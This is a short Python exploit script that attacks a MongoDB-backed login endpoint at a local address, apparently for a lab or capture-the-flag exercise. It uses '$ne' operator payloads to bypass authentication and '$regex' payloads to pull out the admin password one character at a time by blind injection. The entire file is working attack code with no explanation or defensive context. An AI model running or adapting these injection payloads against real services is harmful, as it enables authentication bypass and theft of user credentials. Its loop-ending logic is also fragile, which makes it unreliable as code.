import requests, string
req = requests.session()
arr = string.digits + string.ascii_letters + "_@{}-/()!\"$%=^[]:;"

def blind(data):
    for char in arr:
        res = req.post('http://0.0.0.0/api/sqliMongo',json={'username':'admin','password':{"$regex": f"^{data}{char}"}}).json()
        if res['data']:
            return char
    return None        

def dump_data():
    data = '' 
    while True:
        char = blind(data)
        if char == "$":
            return data 
        data += char 
        print('[+] password: = ',data)

def detect_sqli():
    res = req.post('http://0.0.0.0/api/sqliMongo',json={'username': {"$ne" : 'a'},'password':  {"$ne" : 'a'} }).json()
    print(res)

print('[+] password found : ',dump_data())
